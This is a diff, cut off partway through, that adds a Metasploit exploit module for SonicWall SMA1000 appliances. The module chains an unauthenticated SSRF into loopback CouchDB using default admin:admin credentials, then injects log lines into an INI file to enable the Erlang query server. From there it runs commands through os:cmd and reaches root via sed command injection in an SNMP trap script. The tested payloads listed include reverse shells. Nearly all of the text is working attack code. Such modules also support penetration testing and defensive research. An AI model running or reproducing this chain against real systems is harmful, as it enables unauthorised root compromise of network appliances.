@@ -1,0 +1,841 @@
+##
+# This module requires Metasploit: https://metasploit.com/download
+# Current source: https://github.com/rapid7/metasploit-framework
+##
+
+class MetasploitModule < Msf::Exploit::Remote
+  Rank = GreatRanking
+
+  include Msf::Exploit::Remote::HttpClient
+  include Msf::Exploit::Retry
+  prepend Msf::Exploit::Remote::AutoCheck
+
+  # This existing startup file is writable by the couchdb account and is
+  # already in CouchDB's reloadable INI set. A newly created INI would not be
+  # discovered by _config/_reload, so the exploit must carefully restore this
+  # file rather than use a disposable path.
+  COUCH_INI = '/opt/couchdb/etc/local.d/local-settings.ini'
+
+  def initialize(info = {})
+    super(
+      update_info(
+        info,
+        'Name' => 'SonicWall SMA1000 WorkPlace SSRF to Root Remote Code Execution',
+        'Description' => %q{
+          This module chains three issues in SonicWall SMA1000 appliances. An
+          unauthenticated, absolute-form OPTIONS request makes the WorkPlace
+          listener act as an unintended forward proxy (CVE-2026-83548). The
+          module uses this access and a vendor-installed CouchDB update handler
+          to obtain read and write access to loopback CouchDB (SMA1000-9427),
+          then enables CouchDB's native Erlang query server and executes one
+          command as the couchdb service account.
+
+          That command derives the appliance-local ctrl-service credential and
+          invokes sysCtrl.execCmsSnmpTrap. A command injection in the SNMP trap
+          script (CVE-2026-83549) executes the selected command as root.
+
+          The module attempts to restore the original CouchDB logger
+          configuration, remove its injected INI data, disable the Erlang query
+          server, and delete its randomized CouchDB documents. SonicWall fixed
+          the issues in platform hotfixes 12.4.3-03526 and 12.5.0-02952.
+        },
+        'License' => MSF_LICENSE,
+        'Author' => [
+          'sfewer-r7', # Metasploit Module
+          'William Perry', # Discovery
+          'Adam Babis' # Discovery
+        ],
+        'References' => [
+          ['CVE', '2026-83548'],
+          ['CVE', '2026-83549'],
+          ['URL', 'https://psirt.global.sonicwall.com/vuln-detail/SNWLID-2026-0016'],
+          ['URL', 'https://www.sonicwall.com/support/notices/product-notice-sma-1000-series-affected-by-multiple-vulnerabilities-snwlid-2026-0016/kA1VN000002AXmQ0AW'],
+          ['URL', 'https://software.sonicwall.com/PFORMSMAHOTFIX/Documentation/TechNotepform-hotfix-12.5.0-02952.txt'],
+          ['URL', 'https://www.rapid7.com/blog/post/etr-critical-sonicwall-sma1000-vulnerabilities-cve-2026-83548-cve-2026-83549-exploited-in-the-wild/']
+        ],
+        'DisclosureDate' => '2026-09-01',
+        'Privileged' => true,
+        'Targets' => [
+          [
+            # Successfully tested against the following SonicWall Secure Mobile Access 8200v versions:
+            # * pform-hotfix-12.4.3-03245 (Dec 15, 2025)
+            # * pform-hotfix-12.4.3-03453 (Jul 14, 2026)
+            # * pform-hotfix-12.5.0-02002 (Sep 3, 2025)
+            # * pform-hotfix-12.5.0-02800 (Jun 29, 2026)
+            #
+            # Successfully tested with the following payloads:
+            # * cmd/linux/http/x64/meterpreter/reverse_tcp
+            # * cmd/unix/reverse_bash
+            #
+            # Confirmed to not work on the following SonicWall Secure Mobile Access 8200v versions:
+            # * 12.4.3-02401 (Feb 23, 2024)
+            'Linux Command',
+            {
+              'Platform' => %w[unix linux],
+              'Arch' => ARCH_CMD,
+              'Payload' => {
+                'Space' => 4096,
+                'DisableNops' => true
+              }
+            }
+          ]
+        ],
+        'DefaultTarget' => 0,
+        # The vulnerable entry point is WorkPlace on 443. The Appliance Management Console (AMC)
+        # commonly uses 8443, but neither AMC nor its external login flow participates here, only WorkPlace.
+        'DefaultOptions' => {
+          'RPORT' => 443,
+          'SSL' => true,
+          'HttpClientTimeout' => 30,
+          # A writable directory on the target for fetch based payloads to write to.
+          'FETCH_WRITABLE_DIR' => '/tmp',
+          # Delete the fetch binary after execution.
+          'FETCH_DELETE' => true
+        },
+        'Notes' => {
+          # INI scrubbing kills the supervised couch_proc_manager so it restarts
+          # with restored settings; the appliance itself is not expected to restart.
+          'Stability' => [CRASH_SERVICE_RESTARTS],
+          # The module persists CouchDB documents, writes to an INI, and changes
+          # configuration. Cleanup is best-effort, and logical CouchDB deletion
+          # may retain revisions or tombstones until database compaction.
+          'SideEffects' => [ARTIFACTS_ON_DISK, CONFIG_CHANGES, IOC_IN_LOGS],
+          'Reliability' => [REPEATABLE_SESSION]
+        }
+      )
+    )
+
+    register_advanced_options([
+      OptFloat.new('CouchDBDelay', [true, 'Seconds between asynchronous CouchDB state checks', 2.0])
+    ])
+  end
+
+  def check
+    # CouchDB 3.3.3 answers OPTIONS /_up with a distinctive JSON 405 response.
+    # Receiving it from WorkPlace proves that the unauthenticated absolute-form
+    # request was forwarded to the loopback-only CouchDB listener; this does not
+    # change CouchDB state.
+    res = couch_request('/_up')
+
+    return CheckCode::Unknown('The WorkPlace listener did not respond') unless res
+
+    json = res.get_json_document
+
+    if res.code == 405 && json.is_a?(Hash) && json['error'] == 'method_not_allowed'
+      return CheckCode::Vulnerable('WorkPlace proxied an unauthenticated OPTIONS request to loopback CouchDB')
+    end
+
+    message = "The loopback CouchDB SSRF response was not observed (HTTP #{res.code})"
+
+    res.headers['Server'].to_s.start_with?('SMA/') ? CheckCode::Safe(message) : CheckCode::Unknown(message)
+  end
+
+  def exploit
+    # Chain overview:
+    #
+    # 1. WorkPlace incorrectly proxies an unauthenticated OPTIONS request to
+    #    the loopback-only CouchDB service.
+    # 2. The vulnerable firmware's fixed admin:admin CouchDB credential and
+    #    vendor update handler let that OPTIONS request create documents.
+    # 3. One created design document acts as a small router. It changes later
+    #    internal requests from OPTIONS into the methods CouchDB APIs require.
+    # 4. Directly enabling command-capable Erlang views is blocked, so the
+    #    router redirects CouchDB logging into a writable startup INI. A crafted
+    #    log message appends the setting that enables those views.
+    # 5. Reloading the INI and touching another setting makes CouchDB register
+    #    its native Erlang query server. An Erlang view can then call os:cmd()
+    #    as the unprivileged couchdb account (uid 1010).
+    # 6. That command reads the appliance-local ctrl-service password and sends
+    #    an authenticated XML-RPC request to the root ctrl-service.
+    # 7. CVE-2026-83549 injects the Framework payload into cmsSnmpTrap.sh, where
+    #    it runs as root. The ensure block then reverses the CouchDB changes.
+
+    http_timeout = datastore['HttpClientTimeout'].to_f
+    couchdb_delay = datastore['CouchDBDelay'].to_f
+
+    fail_with(Failure::BadConfig, 'HttpClientTimeout must be greater than zero') unless http_timeout.positive?
+    unless couchdb_delay.positive? && couchdb_delay < http_timeout
+      fail_with(Failure::BadConfig, 'CouchDBDelay must be greater than zero and less than HttpClientTimeout')
+    end
+
+    # AutoCheck calls check unless the operator explicitly disables it. The
+    # chain has no discovery-dependent strategy, so exploit does not reprobe.
+    # These values cross URL, JSON, JavaScript, Erlang, XML, and shell
+    # boundaries. Independent hex values are safe in every representation and
+    # avoid a shared module-specific prefix. CouchDB requires the _design/
+    # namespace for design documents.
+    @tag = Rex::Text.rand_text_hex(16)
+    @stage_id = "_design/#{Rex::Text.rand_text_hex(16)}"
+    @rce_id = "_design/#{Rex::Text.rand_text_hex(16)}"
+    @probe_id = Rex::Text.rand_text_hex(16)
+    @activation = Rex::Text.rand_text_hex(16)
+
+    # The stage design document provides the internal method-changing rewrite
+    # table and log-injection view. The RCE design document holds the native
+    # Erlang maps. The ordinary probe document selects which map may act, while
+    # @tag marks injected INI data and successful responses. @activation names
+    # a harmless temporary setting used to refresh CouchDB's language table.
+
+    # Rewrite selectors are private coordination values, not CouchDB API names.
+    # The generator keeps readable semantic keys in Ruby while placing unique,
+    # JavaScript-safe random strings in the generated design document and URLs.
+    # Each value is cached by key, so rewrite routes, view names, probe fields,
+    # states, and acknowledgements agree throughout one invocation while a new
+    # run gets new values.
+    @operations = Rex::RandomIdentifier::Generator.new(language: :javascript)
+    @original_writer = nil
+    @original_file = nil
+    @original_native = nil
+    @cleanup_required = false
+    @logging_mutation_attempted = false
+    @ini_scrubbed = false
+
+    # CouchDB will execute this wrapper as uid 1010. The wrapper does not run
+    # the Framework payload directly: it invokes the privileged local
+    # ctrl-service, whose cmsSnmpTrap injection runs the payload as root.
+    rce_body = rce_document(ctrl_shell(payload.encoded))
+
+    vprint_status("Using CouchDB artifact tag #{@tag}")
+
+    begin
+      print_status('Staging randomized CouchDB documents')
+      # A missing response is ambiguous: CouchDB may have committed the design
+      # document. Cleanup therefore starts after the first write is attempted,
+      # without treating the target as confirmed modified until it succeeds.
+
+      @cleanup_required = true
+
+      # SMA1000's preinstalled basics update handler parses the request body and
+      # saves it even when CouchDB receives OPTIONS. This creates the rewrite
+      # control plane needed to turn later outer OPTIONS requests into internal
+      # GET, PUT, POST, and DELETE operations.
+      update_document(@stage_id, stage_document)
+
+      # Read all affected values before changing them. nil represents a missing
+      # setting and is intentionally preserved so cleanup can delete, rather
+      # than invent, a value that did not originally exist.
+      @original_writer = config_value(:get_writer)
+      @original_file = config_value(:get_file)
+      @original_native = config_value(:get_native)
+
+      # Cleanup must move logging away from COUCH_INI before truncating the data
+      # appended during exploitation. If CouchDB already uses that file as its
+      # log sink, restoring the original state would leave the logger active and
+      # race the INI scrubber, so do not take ownership of that configuration.
+      if @original_writer == 'file' && @original_file == COUCH_INI
+        fail_with(Failure::BadConfig, "CouchDB is already logging to #{COUCH_INI}; refusing to change operator-managed state")
+      end
+
+      # An already enabled native server may be operator-managed. Refusing this
+      # state avoids disabling or otherwise taking ownership of existing setup.
+      if @original_native == 'true'
+        fail_with(Failure::BadConfig, 'The native Erlang query server is already enabled; refusing to change operator-managed state')
+      end
+
+      # This second design document contains os:cmd() plus the two cleanup maps.
+      update_document(@rce_id, rce_body)
+
+      # Creating the unique probe gives every view a single controlled document
+      # to match. The dirty state cannot execute the payload; it is used only to
+      # force JavaScript view indexing after logging has been redirected.
+      update_document(@probe_id, @operations[:action] => @operations[:dirty])
+
+      print_status('Enabling the CouchDB native Erlang query server')
+      # If interruption lands between these separate requests, cleanup completes
+      # the tagged marker injection before truncating everything appended while
+      # logging was redirected into the INI.
+
+      @logging_mutation_attempted = true
+
+      enable_native_query_setting
+
+      activate_native_query_server
+
+      print_status('Dispatching the root payload through ctrl-service')
+
+      # A new revision with the randomized execution state permits only the
+      # command map to act.
+      # The randomized rewrite performs an internal GET of that Erlang view,
+      # where os:cmd() runs the ctrl-service wrapper as the couchdb account.
+      update_document(@probe_id, @operations[:action] => @operations[:run])
+
+      res = expect_response(rewrite(:run), 200)
+
+      # ctrl_shell prints @tag only after the loopback XML-RPC request succeeds,
+      # so finding it in the emitted view row proves command handoff reached
+      # cmsSnmpTrap. Session creation remains the Framework handler's concern.
+      fail_with(Failure::UnexpectedReply, 'ctrl-service did not acknowledge the command') unless row_contains?(res, @tag)
+
+      print_good('cmsSnmpTrap accepted the root payload')
+    rescue Rex::ConnectionError => e
+      # The same helper exceptions drive best-effort cleanup retries. Convert
+      # only errors escaping the exploit path into Framework failure reasons.
+      fail_with(Failure::Unreachable, e.message)
+    rescue Rex::RuntimeError => e
+      fail_with(Failure::UnexpectedReply, e.message)
+    ensure
+      # Staging begins before the first mutating response can be trusted, so all
+      # normal and exceptional exits enter best-effort restoration. CouchDB
+      # applies several changes asynchronously; poll_until_truthy retries the
+      # complete retryable cleanup sequence within the HTTP timeout budget.
+      if @cleanup_required
+        cleanup_error = nil
+
+        cleaned = poll_until_truthy(
+          timeout: datastore['HttpClientTimeout'],
+          interval: datastore['CouchDBDelay']
+        ) do
+          cleanup_chain
+
+          cleanup_error = nil
+          true
+        rescue StandardError => e
+          cleanup_error = e
+
+          vprint_warning("Cleanup attempt failed: #{e.message}")
+          false
+        end
+        unless cleaned
+          # Payload delivery has already been attempted. Report exhausted cleanup
+          # retries without raising so Framework can continue waiting for a session.
+          cleanup_message = cleanup_error&.message || 'Cleanup did not complete'
+
+          print_warning("Automatic cleanup failed: #{cleanup_message}; CouchDB artifacts tagged #{@tag} may remain")
+        end
+      end
+    end
+  end
+
+  private
+
+  # CVE-2026-83548 is reached through WorkPlace, normally HTTPS/443. AMC on
+  # HTTPS/8443 is not involved. The absolute-form target and alternate-case
+  # translate component select the vulnerable forward-proxy path. Vulnerable
+  # mod_extraweb treats any OPTIONS request as proxy-eligible before login,
+  # while Apache and the module disagree about the mixed-case translate path.
+  def couch_request(path, body: nil)
+    # The 12.4 branch has an additional CORS-resource check before the proxy
+    # handler. Its vulnerable URL classifier normalizes the complete unparsed
+    # URI, including its query, while the later handler classifies only the
+    # parsed path. Enough query-string parent segments reduce the classifier's
+    # copy to a local /__extraweb__ control URL without changing the absolute
+    # destination or CouchDB path. The 12.4.3-03526 fix both stops parsing at
+    # '?' and repeats the CORS check in the proxy handler.
+    query_separator = path.include?('?') ? '&' : '?'
+    admission_bypass = "#{Rex::Text.rand_text_hex(8)}=#{Rex::Text.rand_text_hex(8)}/#{'../' * 12}__extraweb__"
+
+    send_request_raw(
+      {
+        'method' => 'OPTIONS',
+        # send_request_raw preserves this absolute-form request target. Its
+        # authority selects loopback CouchDB. ExtraWeb counts the backslash as
+        # a separator, while libcurl counts the two random names around it as
+        # one segment. The two parent segments therefore remove that combined
+        # segment and the translate marker before CouchDB receives the requested
+        # path. The names need no cross-request stability, so every request gets
+        # a fresh pair. This parser discrepancy works on both 02002 and 02800.
+        'uri' => "http://127.0.0.1:5984/__EXTRAWEB__TRANSLATE/#{Rex::Text.rand_text_hex(8)}\\#{Rex::Text.rand_text_hex(8)}/../..#{path}#{query_separator}#{admission_bypass}",
+        'headers' => {
+          # HttpClient supplies Host from VHOST/RPORT. The Origin must agree
+          # with it for WorkPlace's CORS handling.
+          'Origin' => full_uri('', vhost_uri: true).delete_suffix('/'),
+          # This makes the request resemble a CORS preflight; it does not turn
+          # the backend request into GET. WorkPlace still forwards OPTIONS.
+          'Access-Control-Request-Method' => 'GET',
+          # This is the firmware-wide CouchDB default, not a secret learned
+          # from the selected appliance. mod_extraweb forwards this header, so
+          # loopback CouchDB evaluates the rewritten operations as an admin.
+          'Authorization' => "Basic #{Rex::Text.encode_base64('admin:admin')}",
+          'Content-Type' => 'application/json'
+        },
+        'data' => body.nil? ? '' : body.to_json
+      },
+      datastore['HttpClientTimeout'],
+      true
+    )
+  end
+
+  def expect_response(res, *statuses)
+    raise Rex::ConnectionError, 'The target did not respond' unless res
+
+    return res if statuses.include?(res.code)
+
+    # Limit diagnostic output because a proxy or CouchDB error body can be
+    # large and may contain unrelated appliance data.
+    body = res.body.to_s.byteslice(0, 500)
+
+    raise Rex::RuntimeError, "Unexpected HTTP #{res.code} #{res.message}: #{body}"
+  end
+
+  # The installed basics update handler mutates a document even though the
+  # external request remains OPTIONS. Encoding the slash keeps a design ID in
+  # the handler's single document-ID argument instead of making _design a new
+  # URL segment. This handler is the OPTIONS-to-CouchDB-write bridge tracked by
+  # SMA1000-9427.
+  def update_document(document_id, body)
+    expect_response(couch_request("/u/_design/basics/_update/main/#{document_id.gsub('/', '%2F')}", body: body), 201)
+  end
+
+  # The randomized design rewrite converts the backend OPTIONS request into a
+  # small allowlist of CouchDB GET, PUT, POST, and DELETE operations. The caller
+  # uses a readable Symbol, but @operations resolves it to the same random path
+  # component embedded in stage_document for this exploit invocation.
+  def rewrite(operation, body: nil, query: nil)
+    path = "/u/_design/#{@stage_id.delete_prefix('_design/')}/_rewrite/#{@operations[operation]}"
+
+    path = "#{path}?#{query}" if query
+
+    couch_request(path, body: body)
+  end
+
+  def config_value(operation)
+    res = rewrite(operation)
+
+    # CouchDB returns 404 for a configuration key that does not exist. Retain
+    # that distinction so cleanup restores absence rather than an empty string.
+    return nil if res&.code == 404
+
+    value = expect_response(res, 200).get_json_document
+
+    raise Rex::RuntimeError, "Invalid configuration value returned by #{operation}" unless value.is_a?(String)
+
+    value
+  end
+
+  def row_contains?(res, marker)
+    # Native query views return their Emit() output in the value of a CouchDB
+    # view row. Checking the parsed structure avoids accepting the same marker
+    # from an unrelated response header or error message.
+    json = res.get_json_document
+
+    return false unless json.is_a?(Hash) && json['rows'].is_a?(Array)
+
+    json['rows'].any? { |row| row.is_a?(Hash) && row['value'].to_s.include?(marker) }
+  end
+
+  def wait_for_couchdb(message, &)
+    # Configuration reloads, logger reconfiguration, and Erlang process-manager
+    # subscription changes complete asynchronously. The Retry mixin provides a
+    # single operator-controlled polling interval instead of fixed sleeps.
+    return if poll_until_truthy(
+      timeout: datastore['HttpClientTimeout'],
+      interval: datastore['CouchDBDelay'],
+      &
+    )
+
+    raise Rex::RuntimeError, message
+  end
+
+  def enable_native_query_setting
+    # CouchDB permits administrators to redirect its logger even though direct
+    # HTTP writes to native_query_servers are blacklisted. Select the file
+    # writer, then point it at the already loaded and couchdb-writable INI.
+    expect_response(rewrite(:set_writer, body: 'file'), 200)
+
+    expect_response(rewrite(:set_file, body: COUCH_INI), 200)
+
+    wait_for_couchdb('Failed to enable the native Erlang query server') do
+      # Updating the probe forces CouchDB to rerun the logger map if its first
+      # index pass raced the logger reconfiguration. The randomized nonce field
+      # guarantees a new document revision even when the action is already dirty.
+      update_document(@probe_id, @operations[:action] => @operations[:dirty], @operations[:nonce] => Rex::Text.rand_text_hex(4))
+
+      # Indexing the stage view calls JavaScript log(), whose embedded newlines
+      # append a valid [native_query_servers] section to COUCH_INI.
+      expect_response(rewrite(:stage), 200)
+
+      # Reload reparses the startup INI set without restarting CouchDB. Reading
+      # the setting back proves that the injected section became live.
+      expect_response(rewrite(:reload), 200)
+
+      config_value(:get_native) == 'true'
+    end
+  end
+
+  def activate_native_query_server
+    # couch_proc_manager resubscribes several seconds after reload. Repeating a
+    # harmless config write and a non-triggering view request proves ERLANG is
+    # registered without relying on a firmware-specific fixed sleep. Each fresh
+    # value generates a configuration event; X-Couch-Persist keeps it out of the
+    # INI, and cleanup removes the in-memory key.
+    wait_for_couchdb('Failed to activate the native Erlang query server') do
+      expect_response(rewrite(:activate, body: Rex::Text.rand_text_hex(16)), 200)
+
+      rewrite(:run)&.code == 200
+    end
+  end
+
+  def stage_document
+    # A CouchDB "design document" is a stored JSON object containing server-side
+    # functions. Its rewrites function behaves like a private request router;
+    # its views run code when their _view URLs are queried. This first design
+    # document provides both the method-changing router and the JavaScript view
+    # that writes the configuration text through CouchDB's logger.
+
+    # Rewrite paths are resolved relative to this design document. CouchDB uses
+    # the name without the reserved _design/ prefix when addressing a sibling
+    # design document and its views.
+    rce_name = @rce_id.delete_prefix('_design/')
+
+    # These configuration writes must affect the running node so the chain can
+    # proceed, but they need not be persisted: the injected logger output is
+    # the only intentional modification to COUCH_INI.
+    transient = { 'X-Couch-Persist' => 'false' }.to_json
+
+    # These names are executable JavaScript variables, unlike the opaque route
+    # selectors in @operations, so use the JavaScript-aware generator to avoid
+    # reserved words as well as collisions.
+    identifiers = Rex::RandomIdentifier::Generator.new(language: :javascript)
+
+    # Route aliases are private to the randomized design ID. @operations maps
+    # their descriptive Ruby keys to per-run randomized path components.
+    # request.path[4] is the component after _rewrite. The ../../../ targets
+    # escape the u-database design route and reach CouchDB's node configuration
+    # API. Returning a different method here is how an outer OPTIONS request
+    # becomes the internal GET/PUT/POST/DELETE operation named by each branch.
+    # The branches respectively read/change logger state, inject/reload/activate
+    # the native server, execute or clean up the Erlang views, and retrieve/delete
+    # recovery documents. Only this fixed allowlist is reachable; arbitrary
+    # paths are rejected.
+    rewrites = <<~JAVASCRIPT
+      function(#{identifiers[:request]}) {
+        var #{identifiers[:operation]}=#{identifiers[:request]}.path[4],#{identifiers[:transient_headers]}=#{transient};
+        if(#{identifiers[:operation]}==="#{@operations[:get_writer]}")return {path:"../../../_node/_local/_config/log/writer",method:"GET"};
+        if(#{identifiers[:operation]}==="#{@operations[:get_file]}")return {path:"../../../_node/_local/_config/log/file",method:"GET"};
+        if(#{identifiers[:operation]}==="#{@operations[:set_writer]}")return {path:"../../../_node/_local/_config/log/writer",method:"PUT",headers:#{identifiers[:transient_headers]}};
+        if(#{identifiers[:operation]}==="#{@operations[:set_file]}")return {path:"../../../_node/_local/_config/log/file",method:"PUT",headers:#{identifiers[:transient_headers]}};
+        if(#{identifiers[:operation]}==="#{@operations[:stage]}")return {path:"_view/#{@operations[:stage]}",method:"GET"};
+        if(#{identifiers[:operation]}==="#{@operations[:reload]}")return {path:"../../../_node/_local/_config/_reload",method:"POST"};
+        if(#{identifiers[:operation]}==="#{@operations[:get_native]}")return {path:"../../../_node/_local/_config/native_query_servers/enable_erlang_query_server",method:"GET"};
+        if(#{identifiers[:operation]}==="#{@operations[:activate]}")return {path:"../../../_node/_local/_config/query_server_config/#{@activation}",method:"PUT",headers:#{identifiers[:transient_headers]}};
+        if(#{identifiers[:operation]}==="#{@operations[:get_activate]}")return {path:"../../../_node/_local/_config/query_server_config/#{@activation}",method:"GET"};
+        if(#{identifiers[:operation]}==="#{@operations[:run]}")return {path:"../#{rce_name}/_view/#{@operations[:run]}",method:"GET"};
+        if(#{identifiers[:operation]}==="#{@operations[:restore_config]}")return {path:"../#{rce_name}/_view/#{@operations[:restore_config]}",method:"GET"};
+        if(#{identifiers[:operation]}==="#{@operations[:scrub_ini]}")return {path:"../#{rce_name}/_view/#{@operations[:scrub_ini]}",method:"GET"};
+        if(#{identifiers[:operation]}==="#{@operations[:get_rce]}")return {path:"../#{rce_name}",method:"GET"};
+        if(#{identifiers[:operation]}==="#{@operations[:get_probe]}")return {path:"../../../u/#{@probe_id}",method:"GET"};
+        if(#{identifiers[:operation]}==="#{@operations[:get_self]}")return {path:".",method:"GET"};
+        if(#{identifiers[:operation]}==="#{@operations[:delete_rce]}")return {path:"../#{rce_name}",method:"DELETE",query:#{identifiers[:request]}.query};
+        if(#{identifiers[:operation]}==="#{@operations[:delete_probe]}")return {path:"../../../u/#{@probe_id}",method:"DELETE",query:#{identifiers[:request]}.query};
+        if(#{identifiers[:operation]}==="#{@operations[:delete_self]}")return {path:".",method:"DELETE",query:#{identifiers[:request]}.query};
+        return {code:404,body:"#{@operations[:not_found]}"};
+      }
+    JAVASCRIPT
+
+    # Redirecting CouchDB's JavaScript log output into an already writable INI
+    # bypasses the config API's blacklist for native_query_servers. log() does
+    # not escape embedded newlines, and CouchDB's INI parser ignores the normal
+    # log prefix before accepting the injected section and assignment. Matching
+    # only @probe_id prevents indexing unrelated u-database documents from
+    # repeating the injection.
+    logger = <<~JAVASCRIPT
+      function(#{identifiers[:document]}) {
+        if (#{identifiers[:document]}._id === #{@probe_id.to_json}) {
+          log("\\n; #{@tag}\\n[native_query_servers]\\nenable_erlang_query_server = true\\n");
+        }
+      }
+    JAVASCRIPT
+
+    # CouchDB recognizes rewrites and views only in this design-document shape.
+    # Triggering the stage view executes logger; merely creating the document
+    # does not write to the INI.
+    {
+      'language' => 'javascript',
+      'rewrites' => rewrites,
+      'views' => { @operations[:stage] => { 'map' => logger } }
+    }
+  end
+
+  def erlang_escape(value)
+    # The command is interpolated into an Erlang double-quoted string. Escaping
+    # its two metacharacters preserves the exact shell wrapper passed to
+    # os:cmd(); the operator payload inside that wrapper is already base64.
+    value.gsub(/["\\]/) { |character| "\\#{character}" }
+  end
+
+  def rce_document(command)
+    # Ordinary JavaScript CouchDB views are sandboxed. A design document whose
+    # language is "erlang" instead runs in CouchDB's native Erlang query server,
+    # where os:cmd() is available. The logger/INI stage exists solely to enable
+    # that normally disabled server. This document contains one execution view
+    # and two views that safely undo the configuration and file changes.
+
+    # Cleanup must return its view result before it disables the Erlang server
+    # currently executing that view. Derive the target-side delay from the same
+    # option used for Framework polling so both sides have consistent timing.
+    delay_ms = (datastore['CouchDBDelay'] * 1000).ceil
+
+    # Erlang variables must begin with an uppercase character. Restricting this
+    # generator accordingly keeps the embedded map functions valid while still
+    # making their local names collision-free and non-signatured.
+    identifiers = Rex::RandomIdentifier::Generator.new(
+      min_length: 3,
+      max_length: 12,
+      first_char_set: Rex::Text::UpperAlpha,
+      char_set: "#{Rex::Text::AlphaNumeric}_"
+    )
+
+    # All maps are gated on both the randomized probe ID and a state value
+    # because CouchDB may evaluate every map in a design group while indexing.
+    # Without both checks, requesting one view could execute a command or
+    # cleanup action while CouchDB builds the other indexes.
+
+    # The execution map is the service-account RCE stage. It ignores every
+    # document except the exact probe revision placed in the randomized
+    # execution state, executes the wrapper once through os:cmd(), and emits
+    # its stdout as the view value.
+    run = <<~ERLANG
+      fun({#{identifiers[:document]}})->
+        case {proplists:get_value(<<"_id">>,#{identifiers[:document]}),proplists:get_value(<<"#{@operations[:action]}">>,#{identifiers[:document]})} of
+          {<<"#{@probe_id}">>,<<"#{@operations[:run]}">>}->Emit(null,list_to_binary(os:cmd("#{erlang_escape(command)}")));
+          _->ok
+        end
+      end.
+    ERLANG
+
+    # The restore-configuration map carries the original values from the probe
+    # document into a delayed Erlang worker. null means that a key was originally
+    # absent, so the worker deletes it; otherwise it restores the captured string. Logging
+    # is moved away from COUCH_INI and reconfigured before the native server is
+    # restored and the activation key removed. Running this asynchronously lets
+    # the view emit its scheduling marker before disabling its own query runtime.
+    # CouchDB JSON strings arrive as Erlang binaries, so binary_to_list converts
+    # them for config:set; false makes each config change non-persistent.
+    restore_config = <<~ERLANG
+      fun({#{identifiers[:document]}})->
+        case {proplists:get_value(<<"_id">>,#{identifiers[:document]}),proplists:get_value(<<"#{@operations[:action]}">>,#{identifiers[:document]})} of
+            {<<"#{@probe_id}">>,<<"#{@operations[:restore_config]}">>}->
+              #{identifiers[:writer]}=proplists:get_value(<<"#{@operations[:restore_writer]}">>,#{identifiers[:document]}),
+              #{identifiers[:file_name]}=proplists:get_value(<<"#{@operations[:restore_file]}">>,#{identifiers[:document]}),
+              #{identifiers[:native]}=proplists:get_value(<<"#{@operations[:restore_native]}">>,#{identifiers[:document]}),
+              spawn(fun()->timer:sleep(#{delay_ms}),
+                case #{identifiers[:writer]} of null->ok=config:delete("log","writer",false);#{identifiers[:writer_binary]}->ok=config:set("log","writer",binary_to_list(#{identifiers[:writer_binary]}),false) end,
+                case #{identifiers[:file_name]} of null->ok=config:delete("log","file",false);#{identifiers[:file_binary]}->ok=config:set("log","file",binary_to_list(#{identifiers[:file_binary]}),false) end,
+                ok=couch_log_server:reconfigure(),
+                case #{identifiers[:native]} of null->ok=config:delete("native_query_servers","enable_erlang_query_server",false);#{identifiers[:native_binary]}->ok=config:set("native_query_servers","enable_erlang_query_server",binary_to_list(#{identifiers[:native_binary]}),false) end,
+                ok=config:delete("query_server_config","#{@activation}",false) end),
+            Emit(null,<<"#{@operations[:restore_ack]}">>),ok;
+          _->ok
+        end
+      end.
+    ERLANG
+
+    # The couchdb account cannot create a sibling temporary file in this
+    # directory, so cleanup rewrites the existing inode after logging moves
+    # away. The first notice record is the start of data appended after this
+    # module redirected logging, and the tagged marker proves that data exists.
+    # binary:match locates that marker; binary:matches finds earlier CouchDB
+    # [notice] record boundaries; and the list comprehension selects the first
+    # boundary preceding the injection. The shortened head is written back and
+    # checked for marker absence before cleanup reports success. Finally, the
+    # supervised couch_proc_manager is killed after a delay so it restarts with
+    # the restored native-query-server configuration.
+    scrub_ini = <<~ERLANG
+      fun({#{identifiers[:document]}})->
+        case {proplists:get_value(<<"_id">>,#{identifiers[:document]}),proplists:get_value(<<"#{@operations[:action]}">>,#{identifiers[:document]})} of
+          {<<"#{@probe_id}">>,<<"#{@operations[:scrub_ini]}">>}->
+            #{identifiers[:path]}="#{COUCH_INI}",#{identifiers[:marker]} = <<"; #{@tag}">>,{ok,#{identifiers[:data]}}=file:read_file(#{identifiers[:path]}),
+            {#{identifiers[:marker_position]},_}=binary:match(#{identifiers[:data]},#{identifiers[:marker]}),[#{identifiers[:cut]}|_]=[#{identifiers[:position]}||{#{identifiers[:position]},_}<-binary:matches(#{identifiers[:data]},<<"[notice] ">>),#{identifiers[:position]}<#{identifiers[:marker_position]}],
+            <<#{identifiers[:head]}:#{identifiers[:cut]}/binary,_/binary>> = #{identifiers[:data]},ok=file:write_file(#{identifiers[:path]},#{identifiers[:head]}),nomatch=binary:match(#{identifiers[:head]},#{identifiers[:marker]}),
+            Emit(null,<<"#{@operations[:scrub_ack]}">>),spawn(fun()->timer:sleep(#{delay_ms}),exit(whereis(couch_proc_manager),kill) end),ok;
+          _->ok
+        end
+      end.
+    ERLANG
+
+    # CouchDB selects a native query server from this language field. Keeping
+    # all three maps in one design document allows the same temporarily enabled
+    # Erlang runtime to execute the payload and then restore its own state.
+    {
+      'language' => 'erlang',
+      'views' => {
+        @operations[:run] => { 'map' => run },
+        @operations[:restore_config] => { 'map' => restore_config },
+        @operations[:scrub_ini] => { 'map' => scrub_ini }
+      }
+    }
+  end
+
+  def xml_escape(value)
+    # These values become XML-RPC string nodes. Escape XML metacharacters after
+    # constructing the sed payload so the XML parser reproduces the intended
+    # argument rather than interpreting it as markup.
+    value.gsub('&', '&amp;').gsub('<', '&lt;').gsub('>', '&gt;').gsub('"', '&quot;').gsub("'", '&apos;')
+  end
+
+  def ctrl_shell(command)
+    # WorkPlace cannot call ctrl-service directly: the SSRF preserves OPTIONS,
+    # while XML-RPC needs POST and the service's local credential. CouchDB RCE
+    # solves both restrictions because a local shell can read that credential
+    # and use curl to make the required loopback POST.
+
+    # This wrapper is the only command executed by CouchDB as uid 1010. It
+    # derives a local credential and asks the root ctrl-service to invoke the
+    # separately vulnerable SNMP-trap helper; this is the privilege transition
+    # from CouchDB command execution to the Framework payload running as root.
+    # Base64 keeps arbitrary payload characters intact through Ruby, JSON,
+    # Erlang, the first shell, XML, and the vulnerable sed expression.
+
+    # cmsSnmpTrap.sh inserts parameter two into sed -e
+    # "s^@SUBSTITUTE@^$2^". Close the replacement and add GNU sed's e
+    # command. /bin/sh is dash on SMA1000, so Bash explicitly parses the
+    # decoded Framework payload. Backgrounding lets XML-RPC return normally.
+    substitute = %(x^;e /bin/bash -c "$(/usr/bin/printf %s #{Rex::Text.encode_base64(command)}|/usr/bin/base64 -d)" </dev/null >/dev/null 2>&1 &#)
+
+    # sysCtrl.execCmsSnmpTrap expects four string parameters. The second becomes
